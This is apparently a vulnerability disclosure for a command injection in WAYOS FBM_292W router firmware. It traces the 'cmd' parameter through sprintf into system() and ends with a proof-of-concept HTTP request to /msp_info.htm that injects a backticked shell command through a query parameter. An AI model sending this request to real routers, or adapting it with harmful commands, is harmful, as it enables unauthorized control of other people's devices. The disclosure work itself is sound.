Firmware version:

FBM_292W-21.03.10V.trx

Download address:

https://www.wayos.com/product/jiatingzuwang/jiayongwuxian/jiatingwifituijian/2189.html

Command injection vulnerability:

Command injection exists in the sub_4901E0 function. On line 23, httpd_get_parm sets the flag value of parameter a1 to parm；


![Pasted image 20240806145004](https://github.com/user-attachments/assets/3bc5aaec-00a2-45f0-ae67-cea038fb8213)

In line 45, the value off_755C3C is "cmd"; 
When the parameter is passed in, just carry "cmd" and it will be executed to line 68；
Then the sprintf function is concatenated to v21, and the value of v21 is executed as the parameter of system, resulting in command injection；

![Pasted image 20240806145155](https://github.com/user-attachments/assets/b5841f87-f4ff-41ca-82c9-392bc42f26db)

Here is the FirmAE simulated firmware command injection process

![Pasted image 20240806150053 png](https://github.com/user-attachments/assets/aefd1f13-43c4-4cc7-ab95-82b5e60376bb)

![Pasted image 20240806150808](https://github.com/user-attachments/assets/e64abede-a24d-409c-a8b1-6ff78354f72f)

poc：

```
GET /msp_info.htm?flag=cmd&cmd=`ps%3Ea.txt` HTTP/1.1

Host: 192.168.0.1

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate, br

Accept-Language: zh,en-US;q=0.9,en;q=0.8

Cookie: wys_userid=admin,wys_passwd=861A198CDBD425F0B9D91C42FAB93A86; userid=root; gw_userid=root,gw_passwd=877EDB10AA120D0CE79068CAAE4F6C3A,gw_token=1j2BdpVQZ7o07qq,gw_code=GjyJNVuv302420X

Connection: close


```

